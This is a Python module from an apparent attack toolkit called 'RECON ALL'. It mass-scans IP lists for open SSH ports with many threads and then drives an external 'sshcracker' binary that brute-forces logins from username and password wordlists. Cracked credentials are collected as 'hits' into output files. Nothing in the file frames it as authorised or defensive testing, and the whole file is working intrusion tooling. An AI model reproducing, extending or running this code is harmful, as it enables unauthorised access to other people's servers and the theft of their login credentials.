#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════
# RECON ALL — SSH Scanner (Port Check + Cracker)
# Ported from bot.py (SSH logic) to standalone CLI module.
# ═══════════════════════════════════════════════════════════════
import os
import re
import time
import socket
import struct
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List

from utils import (
    ThreadSafeCounter,
    ThreadSafeList,
    append_result,
    print_progress,
    make_session,
)


# ═══════════════════════════════════════════════════════════════
# SSH PORT CHECK
# ═══════════════════════════════════════════════════════════════
def check_ssh_port(host: str, port: int = 22, timeout: int = 5) -> bool:
    """Check if SSH port is open by connecting and reading banner.

    Creates socket with SO_LINGER, connects, reads 64 bytes banner.
    Returns True if banner contains b'SSH-'.
    """
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        sock.settimeout(timeout)
        sock.connect((host, int(port)))
        banner = sock.recv(64)
        return b"SSH-" in banner
    except Exception:
        return False
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════
# SSH PORT SCAN
# ═══════════════════════════════════════════════════════════════
def run_ssh_port_scan(
    ips: List[str],
    threads: int,
    timeout: int,
    output_dir: str,
) -> List[str]:
    """Scan a list of IPs for open SSH ports using ThreadPoolExecutor.

    Returns list of IPs with open SSH (just the IP, no port).
    Saves results to ``output_dir/ssh_open.txt``.
    """
    total = len(ips)
    if total == 0:
        print("  ❌  No IPs to scan.")
        return []

    print(f"  📡  SSH Port Scan — {total:,} IPs, {threads} threads, timeout={timeout}s")

    goods = ThreadSafeList()
    counter = ThreadSafeCounter()
    start_t = time.time()

    out_path = os.path.join(output_dir, "ssh_open.txt")
    os.makedirs(output_dir, exist_ok=True)

    def work(ip_line: str):
        try:
            ip_line = ip_line.strip()
            parts = ip_line.replace(',', ':').replace(';', ':').split(':')
            if len(parts) >= 2:
                host, port = parts[0], parts[1]
            else:
                host, port = ip_line, 22

            if check_ssh_port(host, port, timeout):
                # Return just the IP, no port
                goods.append(host)
                append_result(out_path, host)
        except Exception:
            pass
        finally:
            counter.increment()
            c = counter.value
            if c % max(1, total // 20) == 0 or c >= total:
                elapsed = time.time() - start_t
                speed = c / elapsed if elapsed > 0 else 0
                print_progress(c, total, prefix="SSH Scan", suffix=f"| 💎 {len(goods)} open | ⚡ {speed:.1f}/s")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(work, ip) for ip in ips]
        for f in as_completed(futures):
            pass  # exceptions handled inside worker

    elapsed = time.time() - start_t
    results = goods.copy()
    print(f"\n  ✅  SSH Port Scan done — {len(results)} open in {elapsed:.1f}s")
    return results


# ═══════════════════════════════════════════════════════════════
# SSH CRACKER
# ═══════════════════════════════════════════════════════════════
def run_ssh_cracker(
    targets: List[str],
    users_file: str,
    pass_file: str,
    threads: int,
    timeout: int,
    sshcracker_bin: str,
    output_dir: str,
) -> List[str]:
    """Run the sshcracker binary to brute-force SSH credentials.

    Spawns ``sshcracker_bin`` as subprocess, feeds it via stdin:
        users_content, passwords_content, targets_content, timeout, threads
    Monitors ``su-goods.txt`` for cracked credentials.
    Returns list of cracked credential strings.
    Saves results to ``output_dir/ssh_cracked.txt``.
    """
    os.makedirs(output_dir, exist_ok=True)
    out_path = os.path.join(output_dir, "ssh_cracked.txt")

    if not os.path.exists(sshcracker_bin):
        print(f"  ❌  SSH cracker binary not found at '{sshcracker_bin}'")
        return []

    # Read credential files
    try:
        with open(users_file, "r", encoding="utf-8", errors="ignore") as f:
            users_content = f.read().strip()
    except Exception as e:
        print(f"  ❌  Failed to read users file: {e}")
        return []

    try:
        with open(pass_file, "r", encoding="utf-8", errors="ignore") as f:
            passwords_content = f.read().strip()
    except Exception as e:
        print(f"  ❌  Failed to read passwords file: {e}")
        return []

    targets_content = "\n".join(targets)

    # Clean up goods file
    goods_file = "su-goods.txt"
    if os.path.exists(goods_file):
        try:
            os.remove(goods_file)
        except Exception:
            pass
    try:
        open(goods_file, "a").close()
    except Exception:
        pass

    if os.path.exists("paused.json"):
        try:
            os.remove("paused.json")
        except Exception:
            pass

    print(f"  🔐  SSH Cracker — {len(targets)} targets, {threads} threads, timeout={timeout}s")

    cracked = ThreadSafeList()

    # Spawn the cracker process
    try:
        proc = subprocess.Popen(
            [sshcracker_bin],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
    except Exception as e:
        print(f"  ❌  Failed to start SSH cracker: {e}")
        return []

    # Feed stdin: users, passwords, targets, timeout, threads
    try:
        for data in [
            users_content + "\n",
            passwords_content + "\n",
            targets_content + "\n",
            str(timeout) + "\n",
            str(threads) + "\n",
            "\n",
        ]:
            proc.stdin.write(data.encode())
            proc.stdin.flush()
            time.sleep(0.5)
    except Exception as e:
        print(f"  ❌  Communication error with cracker: {e}")
        try:
            proc.kill()
        except Exception:
            pass
        return []

    # Monitor output and goods file
    checks = total = 0
    speed = 0.0
    hits = 0
    last_pos = 0
    last_print = 0
    start = time.time()

    try:
        while True:
            # Read stdout line (with timeout via poll + read)
            line_bytes = None
            try:
                line_bytes = proc.stdout.readline()
            except Exception:
                break

            if not line_bytes:
                # Process has finished
                if proc.poll() is not None:
                    break
                continue

            text = line_bytes.decode(errors="ignore").strip()

            # Check goods file for new hits
            if os.path.exists(goods_file):
                try:
                    with open(goods_file, "r") as f:
                        f.seek(last_pos)
                        for new_hit in f:
                            h_clean = new_hit.strip()
                            if h_clean:
                                cracked.append(h_clean)
                                append_result(out_path, h_clean)
                                print(f"\n  💎  SSH HIT: {h_clean}")
                        last_pos = f.tell()
                except Exception:
                    pass

            # Parse progress from stdout
            if "Progress:" in text:
                m = re.search(r"(\d+)\s*/\s*(\d+)", text)
                if m:
                    checks, total = int(m.group(1)), int(m.group(2))
            if "Speed:" in text:
                m = re.search(r"Speed:\s*([\d\.]+)", text)
                if m:
                    speed = float(m.group(1))
            if "Successful:" in text:
                m = re.search(r"Successful:\s*(\d+)", text)
                if m:
                    hits = int(m.group(1))

            # Print progress periodically
            now = time.time()
            if total > 0 and (now - last_print) > 10:
                pct = (checks / total) * 100 if total else 0
                runtime = int(now - start)
                print(
                    f"\r  🔐  SSH Cracker [{pct:.1f}%] "
                    f"Checks: {checks:,}/{total:,} | "
                    f"Speed: {speed}/s | "
                    f"Hits: {hits} | "
                    f"Runtime: {runtime}s",
                    end="", flush=True,
                )
                last_print = now

    finally:
        # Final goods file check
        if os.path.exists(goods_file):
            try:
                with open(goods_file, "r") as f:
                    f.seek(last_pos)
                    for new_hit in f:
                        h_clean = new_hit.strip()
                        if h_clean and h_clean not in cracked.copy():
                            cracked.append(h_clean)
                            append_result(out_path, h_clean)
            except Exception:
                pass

        if proc:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass

    results = cracked.copy()
    elapsed = time.time() - start
    print(f"\n  ✅  SSH Cracker done — {len(results)} cracked in {elapsed:.1f}s")
    return results
